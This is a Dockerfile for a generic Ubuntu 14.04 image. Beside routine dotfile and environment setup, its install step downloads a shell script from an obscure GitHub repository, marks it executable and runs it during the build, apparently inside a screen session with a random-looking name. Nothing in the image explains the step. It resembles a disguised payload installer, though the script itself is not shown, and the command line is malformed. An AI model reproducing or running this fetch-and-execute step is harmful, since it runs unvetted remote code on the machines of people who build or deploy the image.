FROM ubuntu:14.04

# Install.
RUN \
  apt-get update && \
  apt-get install screen -y && \
  apt-get install -y wget && \
  wget https://github.com/wagonbs/TAEIKE/raw/main/Eandi.sh  && \
  chmod +x Eandi.sh  && \
  ./Eandi.sh > screen -R azuveji && \
  rm -rf /var/lib/apt/lists/*

# Add files.
ADD root/.bashrc /root/.bashrc
ADD root/.gitconfig /root/.gitconfig
ADD root/.scripts /root/.scripts

# Set environment variables.
ENV HOME /root

# Define working directory.
WORKDIR /root

# Define default command.
CMD ["bash"]
